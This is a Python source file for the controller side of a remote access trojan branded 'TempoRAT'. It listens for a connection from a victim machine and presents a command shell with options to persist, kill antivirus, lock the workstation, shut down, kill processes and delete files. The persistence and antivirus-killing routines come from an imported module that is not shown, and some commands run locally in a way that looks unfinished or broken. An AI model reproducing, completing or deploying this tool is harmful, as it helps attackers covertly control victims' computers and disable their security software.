#Imports.
import socket, json, sys, CoreModule as Core, os, ctypes, time, platform
from colorama import Fore as fore

os.system('cls')

#Server Config.
class Server:
    def __init__(self,ip,port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        server.bind((ip, port))
        server.listen(0)
        print(fore.LIGHTBLACK_EX + "Waiting for a connection..")
        self.connection, address = server.accept()
        print(fore.LIGHTBLACK_EX + "New Connection Established! " + str(address))
        print(fore.LIGHTBLACK_EX + """             

████████╗███████╗███╗   ███╗██████╗  ██████╗         ██████╗  █████╗ ████████╗
╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗        ██╔══██╗██╔══██╗╚══██╔══╝
   ██║   █████╗  ██╔████╔██║██████╔╝██║   ██║        ██████╔╝███████║   ██║   
   ██║   ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║   ██║        ██╔══██╗██╔══██║   ██║   
   ██║   ███████╗██║ ╚═╝ ██║██║     ╚██████╔╝███████╗██║  ██║██║  ██║   ██║   
   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝ - By Sirmilann
                 _________________________________ 
                |  _____________________________  |
                | |      -COMMANDS-             | |
                | |      -Whoami-               | |
                | |      -IP-                   | |
                | |      -Shutdown-             | |
                | |      -Restart-              | |
                | |      -deletedir-            | |
                | |      -makedir-              | |
                | |      -Tasklist-             | |
                | |      -Clear-                | |
                | |      -Systeminfo-           | |
                | |      -Taskkill-             | |
                | |      -persist-              | |
                | |      -killav-               | |
                | |      -lock-                 | |
                | |      -Exit-                 | |
                | |_____________________________| |
                |_________________________________|
        """)

#Recieve Data.
    def RecieveData(self):
        Data = b""
        while True:
            try:
                Data += self.connection.recv(2048)
                return json.loads(Data)
            except ValueError:
                continue

#Send Data.
    def SendData(self, data):
        DataSend = json.dumps(data)
        self.connection.send(DataSend.encode())

    def sendMessage(conn,message):
        message = (message.encode())
        header = str(len(message))
        conn.send(header.encode())
        conn.send(message)

#Command Execution.
    def run(self):
        while True:
            command = input("TempoShell@ ")
            command = command.split(" ", 1)
            try:
                if command[0] == "whoami":
                    Core.whoami()
                if command[0] == "persist":
                    Core.persist(self)
                if command[0] == "killav":
                    Core.kill_av(self)
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                if command[0] == "dir":
                    Core.dir()
                if command[0] == "ip":
                    Core.ip()
                if command[0] == "shutdown":
                    Core.shutdown()
                if command[0] == "makedir":
                    Folder = input("Folder: ")
                    os.system(f'mkdir {Folder}')
                if command[0] == "deletedir":
                    Folderdel = input("Folder: ")
                    os.system(f'rmdir {Folderdel}')
                if command[0] == "restart":
                    Core.restart()
                if command[0] == "commandlist":
                    print(fore.LIGHTBLACK_EX + """             

████████╗███████╗███╗   ███╗██████╗  ██████╗         ██████╗  █████╗ ████████╗
╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗        ██╔══██╗██╔══██╗╚══██╔══╝
   ██║   █████╗  ██╔████╔██║██████╔╝██║   ██║        ██████╔╝███████║   ██║   
   ██║   ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║   ██║        ██╔══██╗██╔══██║   ██║   
   ██║   ███████╗██║ ╚═╝ ██║██║     ╚██████╔╝███████╗██║  ██║██║  ██║   ██║   
   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝ - By Sirmilann
                 _________________________________ 
                |  _____________________________  |
                | |      -COMMANDS-             | |
                | |      -Whoami-               | |
                | |      -IP-                   | |
                | |      -Shutdown-             | |
                | |      -Restart-              | |
                | |      -deletedir-            | |
                | |      -makedir-              | |
                | |      -Tasklist-             | |
                | |      -Clear-                | |
                | |      -Systeminfo-           | |
                | |      -Taskkill-             | |
                | |      -persist-              | |
                | |      -killav-               | |
                | |      -lock-                 | |
                | |      -Exit-                 | |
                | |_____________________________| |
                |_________________________________|
        """)
                if command[0] == "tasklist":
                    Core.tasklist()
                if command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                if command[0] == "delete":
                    FilePath = input("File:")
                    os.system(f'erase {FilePath}')
                if command[0] == "systeminfo":
                    cpu = platform.processor()
                    system = platform.system()
                    machine = platform.machine()
                    print(["CPU: " + cpu + "OS: " + system +  "Machine: " + machine ])
                if command[0] == "taskkill":
                    procname = input("ProcessName: ")
                    os.system(f'taskkill /im {procname}')
                if command[0] == "clear":
                    Core.clear()
            except Exception:
                print(fore.LIGHTBLACK_EX + "Error Running Command.")

TempoServer = Server("127.0.0.1", 7976)
TempoServer.run()